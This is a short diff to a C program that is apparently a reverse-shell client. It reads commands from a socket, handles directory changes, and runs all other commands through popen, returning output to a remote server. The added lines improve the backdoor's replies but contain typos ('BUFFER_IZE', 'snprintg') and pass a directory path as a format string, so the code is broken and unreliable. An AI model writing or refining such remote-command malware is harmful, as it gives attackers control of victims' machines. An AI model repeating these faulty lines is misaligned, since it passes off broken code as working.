@@ -45,7 +45,7 @@ int main() {
     //Execute command
     while (1) {
         memset(buffer, 0, BUFFER_SIZE);
-        int bytes_received = recv(sock, buffer, BUFFER_SIZE, 0);
+        int bytes_received = recv(sock, buffer, BUFFER_IZE, 0);
         if (bytes_received <= 0) {
             printf("[!] Connection closed by server\n");
             break;
@@ -56,6 +56,12 @@ int main() {
         if (strncmp(buffer, "cd ", 3) == 0) {
             if (chdir(buffer + 3) < 0) {
                 perror("[!] Error when changing directory");
+                send(sock, "[!] Error when changing direcory\n", 34, 0);
+            }
+            else {
+                getcwd(cwd, sizeof(cwd));
+                snprintg(command, sizeof(command), cwd);
+                send(sock, command, strlen(command), 0);
             }
         } else {
             FILE *fp = popen(buffer, "r");
